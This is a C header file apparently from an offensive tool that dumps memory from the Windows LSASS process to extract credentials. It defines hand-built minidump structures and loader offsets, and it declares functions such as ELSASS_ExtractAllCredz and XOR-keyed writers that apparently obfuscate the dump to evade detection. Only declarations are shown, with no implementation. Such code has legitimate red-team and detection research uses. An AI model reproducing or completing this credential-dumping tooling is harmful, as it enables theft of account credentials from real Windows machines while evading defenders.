#ifndef ELSASS_H
# define ELSASS_H

# include <windows.h>
# include <stdint.h>
# include "Typedefs.h"

# define RVA(type, base_addr, rva) (type)((ULONG_PTR) base_addr + rva)
# define MEMORY_BUFFER_SIZE_MB 256
# define DUMP_MAX_SIZE 0x0c800000 //200MB
# define SIZE_OF_HEADER 32
# define SIZE_OF_DIRECTORY 12
# define SIZE_OF_SYSTEM_INFO_STREAM 48
# define SIZE_OF_MINIDUMP_MODULE 108
# define OSMAJORVERSION_OFFSET 0x118
# define OSMINORVERSION_OFFSET 0x11c
# define OSBUILDNUMBER_OFFSET 0x120
# define OSPLATFORMID_OFFSET 0x124
# define CSDVERSION_OFFSET 0x2e8
# define PROCESSOR_ARCHITECTURE AMD64
# define MODULE_LIST_POINTER_OFFSET 0x10
# define LDR_POINTER_OFFSET 0x18
# define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))

//=============================================================================
//|                            Hold dump metadata                             |
//=============================================================================
enum ProcessorArchitecture
{
	AMD64 = 9,
	INTEL = 0,
};

typedef struct DumpContext
{
	HANDLE  hProcess;
	PVOID   BaseAddress;
	ULONG32 rva;
	SIZE_T  DumpMaxSize;
	ULONG32 Signature;
	USHORT  Version;
	USHORT  ImplementationVersion;
} DUMPCONTEXT, * PDUMPCONTEXT;

typedef struct C_ModuleInfo
{
	ULONG64 dll_base;
	ULONG32 size_of_image;
	char dll_name[512];
	ULONG32 name_rva;
	ULONG32 TimeDateStamp;
	ULONG32 CheckSum;
	struct C_ModuleInfo* next;
} C_MODULEINFO, * PC_MODULEINFO;

typedef struct _VsFixedFileInfo
{
	ULONG32 dwSignature;
	ULONG32 dwStrucVersion;
	ULONG32 dwFileVersionMS;
	ULONG32 dwFileVersionLS;
	ULONG32 dwProductVersionMS;
	ULONG32 dwProductVersionLS;
	ULONG32 dwFileFlagsMask;
	ULONG32 dwFileFlags;
	ULONG32 dwFileOS;
	ULONG32 dwFileType;
	ULONG32 dwFileSubtype;
	ULONG32 dwFileDateMS;
	ULONG32 dwFileDateLS;
} VsFixedFileInfo, * PVsFixedFileInfo;

typedef struct _DumpLocationDescriptor
{
	ULONG32 DataSize;
	ULONG32 rva;
} DumpLocationDescriptor, * PDumpLocationDescriptor;

typedef struct _DumpModule
{
	ULONG64 BaseOfImage;
	ULONG32 SizeOfImage;
	ULONG32 CheckSum;
	ULONG32 TimeDateStamp;
	ULONG32 ModuleNameRva;
	VsFixedFileInfo VersionInfo;
	DumpLocationDescriptor CvRecord;
	DumpLocationDescriptor MiscRecord;
	ULONG64 Reserved0;
	ULONG64 Reserved1;
} DumpModule, * PDumpModule;

typedef struct _DumpHeader
{
	ULONG32       Signature;
	SHORT         Version;
	SHORT         ImplementationVersion;
	ULONG32       NumberOfStreams;
	ULONG32       StreamDirectoryRva;
	ULONG32       CheckSum;
	ULONG32       Reserved;
	ULONG32       TimeDateStamp;
	ULONG32       Flags;
} DumpHeader, * PDumpHeader;

typedef struct _DumpDirectory
{
	ULONG32       StreamType;
	ULONG32       DataSize;
	ULONG32       Rva;
} DUMPDIRECTORY, * PDUMPDIRECTORY;

typedef struct _DumpSystemInfo
{
	SHORT ProcessorArchitecture;
	SHORT ProcessorLevel;
	SHORT ProcessorRevision;
	char    NumberOfProcessors;
	char    ProductType;
	ULONG32 MajorVersion;
	ULONG32 MinorVersion;
	ULONG32 BuildNumber;
	ULONG32 PlatformId;
	ULONG32 CSDVersionRva;
	SHORT SuiteMask;
	SHORT Reserved2;
	ULONG64 ProcessorFeatures1;
	ULONG64 ProcessorFeatures2;
} DUMPSYSTEMINFO, * PDUMPSYSTEMINFO;

struct _RTL_BALANCED_NODE
{
	union
	{
		struct _RTL_BALANCED_NODE* Children[2];                             //0x0
		struct
		{
			struct _RTL_BALANCED_NODE* Left;                                //0x0
			struct _RTL_BALANCED_NODE* Right;                               //0x8
		};
	};
	union
	{
		struct
		{
			UCHAR Red : 1;                                                    //0x10
			UCHAR Balance : 2;                                                //0x10
		};
		ULONGLONG ParentValue;                                              //0x10
	};
};

struct CREDZ_LDR_DATA_TABLE_ENTRY
{
	struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
	struct _LIST_ENTRY InMemoryOrderLinks;                                  //0x10
	struct _LIST_ENTRY InInitializationOrderLinks;                          //0x20
	PVOID DllBase;                                                          //0x30
	PVOID EntryPoint;                                                       //0x38
	ULONG32 SizeOfImage;                                                    //0x40
	struct _LSA_UNICODE_STRING FullDllName;                                     //0x48
	struct _LSA_UNICODE_STRING BaseDllName;                                     //0x58
	UCHAR FlagGroup[4];                                                     //0x68
	USHORT ObsoleteLoadCount;                                               //0x6c
	USHORT TlsIndex;                                                        //0x6e
	struct _LIST_ENTRY HashLinks;                                           //0x70
	ULONG TimeDateStamp;                                                    //0x80
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;                //0x88
	void* Lock;                                                             //0x90
	struct _LDR_DDAG_NODE* DdagNode;                                        //0x98
	struct _LIST_ENTRY NodeModuleLink;                                      //0xa0
	struct _LDRP_LOAD_CONTEXT* LoadContext;                                 //0xb0
	void* ParentDllBase;                                                    //0xb8
	void* SwitchBackContext;                                                //0xc0
	struct _RTL_BALANCED_NODE BaseAddressIndexNode;                         //0xc8
	struct _RTL_BALANCED_NODE MappingInfoIndexNode;                         //0xe0
	ULONGLONG OriginalBase;                                                 //0xf8
	union _LARGE_INTEGER LoadTime;                                          //0x100
	ULONG BaseNameHashValue;                                                //0x108
	ULONG32 LoadReason;                                                     //0x10c
	ULONG ImplicitPathOptions;                                              //0x110
	ULONG ReferenceCount;                                                   //0x114
	ULONG DependentLoadFlags;                                               //0x118
	UCHAR SigningLevel;                                                     //0x11c
	ULONG CheckSum;                                                         //0x120
};

typedef struct _DumpMemoryDescriptor64
{
	struct _DumpMemoryDescriptor64* next;
	ULONG64 StartOfMemoryRange;
	ULONG64 DataSize;
	DWORD   State;
	DWORD   Protect;
	DWORD   Type;
} DumpMemoryDescriptor64, * PDumpMemoryDescriptor64;

//=============================================================================
//|                                Functions                                  |
//=============================================================================
ULONG ELSASS_FindPid();
BOOL El_Sass(HANDLE hProcess, const void** bufferAddress, int* bytesReadAddress);
BOOL ELSASS_ExtractAllCredz(PDUMPCONTEXT dc);
void ELSASS_Append(IN PDUMPCONTEXT dc, IN const PVOID data, IN ULONG32 size, IN UINT xorkey);
void ELSASS_Writeat(IN PDUMPCONTEXT dc, IN ULONG32 rva, IN const PVOID data, IN unsigned size, IN UINT xorkey);
PC_MODULEINFO ELSASS_ExtractModulesList(PDUMPCONTEXT dc);
PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PC_MODULEINFO module_list);

#endif

